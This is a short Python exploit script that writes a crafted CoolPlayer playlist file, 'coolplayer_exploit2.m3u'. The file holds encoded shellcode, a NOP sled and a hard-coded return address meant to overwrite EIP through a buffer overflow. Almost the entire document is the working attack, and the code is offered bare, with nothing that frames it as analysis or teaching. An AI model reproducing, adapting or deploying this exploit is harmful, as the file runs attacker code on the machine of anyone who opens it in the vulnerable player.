#!/usr/bin/python
import struct
def little_endian(address):
  return struct.pack("<L",address)

file="coolplayer_exploit2.m3u"
buffer=10000

shell = (
"\xb8\x4d\x25\x9c\x45\xdb\xcf\xd9\x74\x24\xf4\x5a\x29"
"\xc9\xb1\x31\x31\x42\x13\x83\xea\xfc\x03\x42\x42\xc7"
"\x69\xb9\xb4\x85\x92\x42\x44\xea\x1b\xa7\x75\x2a\x7f"
"\xa3\x25\x9a\x0b\xe1\xc9\x51\x59\x12\x5a\x17\x76\x15"
"\xeb\x92\xa0\x18\xec\x8f\x91\x3b\x6e\xd2\xc5\x9b\x4f"
"\x1d\x18\xdd\x88\x40\xd1\x8f\x41\x0e\x44\x20\xe6\x5a"
"\x55\xcb\xb4\x4b\xdd\x28\x0c\x6d\xcc\xfe\x07\x34\xce"
"\x01\xc4\x4c\x47\x1a\x09\x68\x11\x91\xf9\x06\xa0\x73"
"\x30\xe6\x0f\xba\xfd\x15\x51\xfa\x39\xc6\x24\xf2\x3a"
"\x7b\x3f\xc1\x41\xa7\xca\xd2\xe1\x2c\x6c\x3f\x10\xe0"
"\xeb\xb4\x1e\x4d\x7f\x92\x02\x50\xac\xa8\x3e\xd9\x53"
"\x7f\xb7\x99\x77\x5b\x9c\x7a\x19\xfa\x78\x2c\x26\x1c"
"\x23\x91\x82\x56\xc9\xc6\xbe\x34\x87\x19\x4c\x43\xe5"
"\x1a\x4e\x4c\x59\x73\x7f\xc7\x36\x04\x80\x02\x73\xfa"
"\xca\x0f\xd5\x93\x92\xc5\x64\xfe\x24\x30\xaa\x07\xa7"
"\xb1\x52\xfc\xb7\xb3\x57\xb8\x7f\x2f\x25\xd1\x15\x4f"
"\x9a\xd2\x3f\x2c\x7d\x41\xa3\x9d\x18\xe1\x46\xe2"
)
nops = "\x90" * (260 - len(shell))
eip = little_endian(0x7522eb9a) #call ebx
exploit = shell + nops + eip
footer = "\x90" * (buffer - len(exploit) - len(eip))
f=open(file,"w")
f.write(exploit + footer)
f.close()
